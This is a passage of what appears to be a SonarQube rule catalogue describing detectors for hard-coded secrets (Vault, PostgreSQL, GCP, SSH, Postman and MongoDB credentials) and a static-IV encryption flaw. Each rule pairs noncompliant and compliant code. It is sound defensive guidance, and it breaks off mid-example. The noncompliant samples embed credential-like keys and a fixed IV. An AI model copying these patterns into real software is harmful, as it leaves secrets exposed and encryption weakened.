  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6773">
              secrets:S6773
            </a>
          </td>
          <td>
            <details>
              <p>HashiCorp Vault is a popular open-source tool used for securely storing and accessing sensitive data such as passwords, API keys, certificates, and
encryption keys. It provides a centralized solution for managing secrets and helps organizations enforce security best practices.</p>
<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a HashiCorp Vault token is compromised, it can have serious consequences for the security of the system and the sensitive data stored within the
Vault. Here are some potential consequences:</p>
<h4>Compromise of sensitive personal data</h4>
<p>This kind of service is often used to exchange information that could include personal information, chat logs, and other private data that users
have shared on the platform. This is called <a href="https://gdpr.eu/eu-gdpr-personal-data/"><code>Personally Identifiable Information</code></a>.<br>
The leaked app key could provide a gateway for unauthorized individuals to access and misuse this data, compromising the privacy and safety of the
application users.</p>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If this kind of sensitive personal data
gets leaked, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>
<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit
trail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or
fraudulent activity.</p>
<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal
complications.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import hvac

client = hvac.Client(url='https://vault.example.com', token='hvb.AAAAAQJyBEVF-vTWUrg0hcoIPuvKjjNxXXZ5MfsYVg2gJ0fGZpVi0IGTFfh4TqsoQIWaocNRXD1qzGXvhIHWJBM_rWU9YJY8sXOYVy_s1JAHasXJwGmZ_fBLJfSG6aCwQkCGwtAhYw') # Noncompliant

secret = client.secrets.kv.v2.read_secret_version(path='secret/myapp')
data = secret['data']
username = data.get('username')
password = data.get('password')
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import hvac

client = hvac.Client(url='https://vault.example.com', token=os.environ.get('VAULT_TOKEN'))

secret = client.secrets.kv.v2.read_secret_version(path='secret/myapp')
data = secret['data']
username = data.get('username')
password = data.get('password')
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p><a href="https://developer.hashicorp.com/vault/docs/concepts/tokens#token-types">Hashicorp API Documentation - Tokens</a></p>
<p><a href="https://developer.hashicorp.com/vault/tutorials/tokens/tokens">Hashicorp API Tutorial - Tokens</a></p>
<p><a href="https://developer.hashicorp.com/vault/tutorials/tokens/batch-tokens">Hashicorp API Tutorial - Batch tokens</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6698">
              secrets:S6698
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords in PostgreSQL are used to authenticate users against the database engine. They are associated with user accounts that are granted
specific permissions over the database and its hosted data.</p>
<p>If a PostgreSQL password leaks to an unintended audience, it can have serious consequences for the security of your database, the data stored
within it, and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a PostgreSQL database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on
the purposes the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the PostgreSQL instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>By default, no connection information is logged by PostgreSQL server. The <code>log_connections</code> parameter must be set to <code>true</code>
in the server configuration for this to happen.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<p><strong>Never hard-code secrets, not even the default values</strong></p>
<p>It is important that you do not hard-code secrets, even default values.</p>
<p>First, hard-coded default secrets are often short and can be easily compromised even by attackers who do not have access to the code base.</p>
<p>Second, hard-coded default secrets can cause problems if they need to be changed or replaced.</p>
<p>And most importantly, there is always the possibility to accidentally set default secrets for production services, which can lead to security
vulnerabilities and make production insecure by default.</p>
<p>To minimize these risks, it is recommended to apply the above strategies, even for the default settings.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
uri = "postgres://foouser:foopass@example.com/testdb"
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os

user = os.environ["PG_USER"]
password = os.environ["PG_PASSWORD"]
uri = f"postgres://{user}:{password}@example.com/testdb"
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> PostgreSQL Documentation - <a href="https://www.postgresql.org/docs/15/client-authentication.html">Client Authentication</a> </li>
  <li> PostgreSQL Documentation - <a href="https://www.postgresql.org/docs/current/runtime-config-logging.html">Error Reporting and Logging</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6335">
              secrets:S6335
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the secret.</p>
<h4>Phishing and spam</h4>
<p>An attacker can use this secret to spam users or lure them into links to a malicious domain controlled by the attacker.</p>
<p>Spam can cause users to be exposed to the following:</p>
<ul>
  <li> Unsolicited, inappropriate content, such as pornographic material </li>
  <li> Fraudulent attempts to trick users into sending information or money </li>
  <li> Abusive or hateful statements </li>
  <li> False advertising or fraudulent claims </li>
</ul>
<p>Once a user has been phished on a legitimate-seeming third-party website, an attacker can collect the user’s credentials, bypass multi-factor
authentication (MFA), and take over the user’s account on the trusted website.</p>
<h4>Malware distribution</h4>
<p>Due to this vulnerability, malware can be stored and spread, both to users of the service and to other potential targets.<br> A malware depends on
the attacker’s intentions, as the following examples show:</p>
<ul>
  <li> Cryptojacking malware, whose goal is to "mine" cryptocurrencies on the affected computers or servers. </li>
  <li> Spyware that spies out sensitive information from victims. </li>
</ul>
<p>In the worst case, malware can cause the target systems to be completely compromised and allow attackers to infiltrate the systems.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<p>Here is an example of a service account key file. In general it is in the form of a json file as demonstrated in the <a
href="https://cloud.google.com/iam/docs/keys-create-delete#creating">GCP docs</a>.</p>
<pre>
{
    "type": "service_account",
    "project_id": "example-project",
    "private_key_id": "2772b8e6f42dc67369b98f0b91694f7805b28844",
    "private_key": "-----BEGIN PRIVATE KEY-----\nKBww9jggAgBEHBCBAASIMDsoCBAuAQINAgFAGSXQTkiAE0cEIkoQghJAqGavB/r3\n2W6raHa1Qrfj6pii5U2Ok53SxCyK3TxYc3Bfxq8orZeYC9LQ/I3tz7w4/BnT71AD\nfP1i8SWHsRMIicSuVFcRoYMA+A1eNSmdrujdBNWgedfuSyHbPnNY7s8BBUIoBN7I\n8gJG5DUUKAZfZDB2c/n7Yu0=\n-----END PRIVATE KEY-----\n",
    "client_email": "example@example.iam.gserviceaccount.example.com",
    "client_id": "492539091821492546176",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/example%40example.iam.gserviceaccount.example.com",
    "universe_domain": "googleapis.com"
}
</pre>
<h4>Compliant solution</h4>
<p>Always avoid committing service account key files to public systems. Use any <code>*ignore</code> file possible, such as <code>.gitignore</code>,
<code>.dockerignore</code> and equivalents for any other system accessing your local codebase.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6693">
              secrets:S6693
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>SSH private keys are used for authentication and secure communication in SSH (Secure Shell) protocols. They are a form of asymmetric cryptography,
where a pair of keys is generated: a private key and a corresponding public key. SSH keys provide a secure and efficient way to authenticate and
establish secure connections between clients and servers. They are widely used for remote login, file transfer, and secure remote administration.</p>
<p>When an SSH private key is leaked to an unintended audience, it can have severe consequences for security and confidentiality. One of the primary
outcomes is unauthorized access. The unintended audience can exploit the leaked private key to authenticate themselves as the legitimate owner,
gaining unauthorized entry to systems, servers, or accounts that accept the key for authentication. This unauthorized access opens the door for
various malicious activities, including data breaches, unauthorized modifications, and misuse of sensitive information.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>Depending on the information system the key is used to authenticate against, the audit method might change. For example, on Linux systems, the
system-wide authentication logs could be used to audit recent connections from an affected account.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
String key = """
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    QyNTUxOQAAACDktj2RM1D2wRTQ0H+YZsFqnAuZrqBNEB4PpJ5xm73nWwAAAJgJVPFECVTx
    RAAAAAtzc2gtZWQyNTUxOQAAACDktj2RM1D2wRTQ0H+YZsFqnAuZrqBNEB4PpJ5xm73nWw
    AAAECQ8Nzp6a1ZJgS3SWh2pMxe90W9tZVDZ+MZT35GjCJK2uS2PZEzUPbBFNDQf5hmwWqc
    C5muoE0QHg+knnGbvedbAAAAFGdhZXRhbmZlcnJ5QFBDLUwwMDc3AQ==
    -----END OPENSSH PRIVATE KEY-----""";
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
String key = System.getenv("SSH_KEY");
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6771">
              secrets:S6771
            </a>
          </td>
          <td>
            <details>
              <p>Postman is an API development and testing platform that allows developers to design, build, and test APIs. Postman tokens are used for
authentication and authorization purposes when making API requests.</p>
<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Postman token is leaked or compromised, it can lead to several security issues and risks. Here are some potential consequences:</p>
<h4>Unauthorized access</h4>
<p>An attacker who gains access to a leaked token can use it to impersonate the legitimate user or application associated with the token. This can
result in unauthorized access to sensitive data or functionality within the API.</p>
<h4>Data breaches</h4>
<p>If the leaked token provides access to sensitive data, an attacker can use it to retrieve or manipulate that data. This can lead to data breaches
that compromise the confidentiality and integrity of the information. Depending on the type of data that is compromised, it could lead to privacy
violations, identity theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>API abuse</h4>
<p>With a leaked token, an attacker can abuse the API by making unauthorized requests, consuming excessive resources, or performing malicious actions.
This can disrupt the API’s regular operation, impact performance, or even cause denial-of-service (DoS) attacks.</p>
<h4>Privilege escalation</h4>
<p>Depending on the permissions and scope associated with the token, an attacker may be able to escalate their privileges within the API. They can
gain access to additional resources or perform actions that they are not authorized to do.</p>
<h4>Breach of trust in non-repudiation and disruption of the audit trail</h4>
<p>When such a secret is compromised, malicious actors might have the possibility to send malicious event objects, causing discrepancies in the audit
trail. This can make it difficult to trace and verify the sequence of events, impacting the ability to investigate and identify unauthorized or
fraudulent activity.</p>
<p>All in all, this can lead to problems in proving the validity of transactions or actions performed, potentially leading to disputes and legal
complications.</p>
<h4>Reputation damage</h4>
<p>If a token is leaked and used for malicious purposes, it can damage the reputation of the API provider. Users may lose trust in the security of the
API, leading to a loss of business and credibility.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const axios = require('axios');

const apiKey = 'PMAK-6502e63761882f002a69f0cb-6d9bc58cd0cc60ff5547f81cf2ca141bb9'; // Noncompliant
const options = {
    method: 'get',
    url: 'https://api.getpostman.com/me',
    headers: {
        'Content-Type': 'application/json',
        'X-API-Key': apiKey
    }
};

(async() =&gt; { await axios(options); })();
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const axios = require('axios');

const apiKey = process.env.POSTMAN_API_KEY;
const options = {
    method: 'get',
    url: 'https://api.getpostman.com/me',
    headers: {
        'Content-Type': 'application/json',
        'X-API-Key': apiKey
    }
};

(async() =&gt; { await axios(options); })();
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<p><a href="https://www.postman.com/postman/workspace/postman-public-workspace/documentation/12959542-c8142d51-e97c-46b6-bd77-52bb66712c9a">Postman
API</a></p>
<h3>Articles &amp; blog posts</h3>
<p><a href="https://blog.postman.com/how-to-get-started-with-the-postman-api/">How to Get Started with the Postman API</a></p>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6694">
              secrets:S6694
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords in MongoDB are used to authenticate users against the database engine. They are associated with user accounts that are granted specific
permissions over the database and its hosted data.</p>
<p>If a MongoDB password leaks to an unintended audience, it can have serious consequences for the security of your database, the data stored within
it, and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a MongoDB database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on the
purposes the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the MongoDB instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>MongoDB instances maintain a log that includes user authentication events. This one could be used to audit recent malicious connections.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
uri = "mongodb://foouser:foopass@example.com/testdb"
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os

user = os.environ["MONGO_USER"]
password = os.environ["MONGO_PASSWORD"]
uri = f"mongodb://{user}:{password}@example.com/testdb"
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
<h3>Documentation</h3>
<ul>
  <li> MongoDB Documentation - <a href="https://www.mongodb.com/docs/manual/reference/log-messages/">Log Messages</a> </li>
  <li> MongoDB Documentation - <a href="https://www.mongodb.com/docs/manual/core/authentication/">Authentication</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=csharpsquid:S3329">
              csharpsquid:S3329
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability exposes encrypted data to a number of attacks whose goal is to recover the plaintext.</p>
<h2>Why is this an issue?</h2>
<p>Encryption algorithms are essential for protecting sensitive information and ensuring secure communications in a variety of domains. They are used
for several important reasons:</p>
<ul>
  <li> Confidentiality, privacy, and intellectual property protection </li>
  <li> Security during transmission or on storage devices </li>
  <li> Data integrity, general trust, and authentication </li>
</ul>
<p>When selecting encryption algorithms, tools, or combinations, you should also consider two things:</p>
<ol>
  <li> No encryption is unbreakable. </li>
  <li> The strength of an encryption algorithm is usually measured by the effort required to crack it within a reasonable time frame. </li>
</ol>
<p>In the mode Cipher Block Chaining (CBC), each block is used as cryptographic input for the next block. For this reason, the first block requires an
initialization vector (IV), also called a "starting variable" (SV).</p>
<p>If the same IV is used for multiple encryption sessions or messages, each new encryption of the same plaintext input would always produce the same
ciphertext output. This may allow an attacker to detect patterns in the ciphertext.</p>
<h3>What is the potential impact?</h3>
<p>After retrieving encrypted data and performing cryptographic attacks on it on a given timeframe, attackers can recover the plaintext that
encryption was supposed to protect.</p>
<p>Depending on the recovered data, the impact may vary.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Additional attack surface</h4>
<p>By modifying the plaintext of the encrypted message, an attacker may be able to trigger additional vulnerabilities in the code. An attacker can
further exploit a system to obtain more information.<br> Encrypted values are often considered trustworthy because it would not be possible for a
third party to modify them under normal circumstances.</p>
<h4>Breach of confidentiality and privacy</h4>
<p>When encrypted data contains personal or sensitive information, its retrieval by an attacker can lead to privacy violations, identity theft,
financial loss, reputational damage, or unauthorized access to confidential systems.</p>
<p>In this scenario, a company, its employees, users, and partners could be seriously affected.</p>
<p>The impact is twofold, as data breaches and exposure of encrypted data can undermine trust in the organization, as customers, clients and
stakeholders may lose confidence in the organization’s ability to protect their sensitive data.</p>
<h4>Legal and compliance issues</h4>
<p>In many industries and locations, there are legal and compliance requirements to protect sensitive data. If encrypted data is compromised and the
plaintext can be recovered, companies face legal consequences, penalties, or violations of privacy laws.</p>
<h2>How to fix it in .NET</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
using System.IO;
using System.Security.Cryptography;

public void Encrypt(byte[] key, byte[] dataToEncrypt, MemoryStream target)
{
    var aes = new AesCryptoServiceProvider();

    byte[] iv     = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
    var encryptor = aes.CreateEncryptor(key, iv); // Noncompliant

    var cryptoStream = new CryptoStream(target, encryptor, CryptoStreamMode.Write);
    var swEncrypt    = new StreamWriter(cryptoStream);

    swEncrypt.Write(dataToEncrypt);
}
</pre>
<h4>Compliant solution</h4>
<p>In this example, the code implicitly uses a number generator that is considered <strong>strong</strong>, thanks to <code>aes.IV</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
using System.IO;
using System.Security.Cryptography;

public void Encrypt(byte[] key, byte[] dataToEncrypt, MemoryStream target)
{
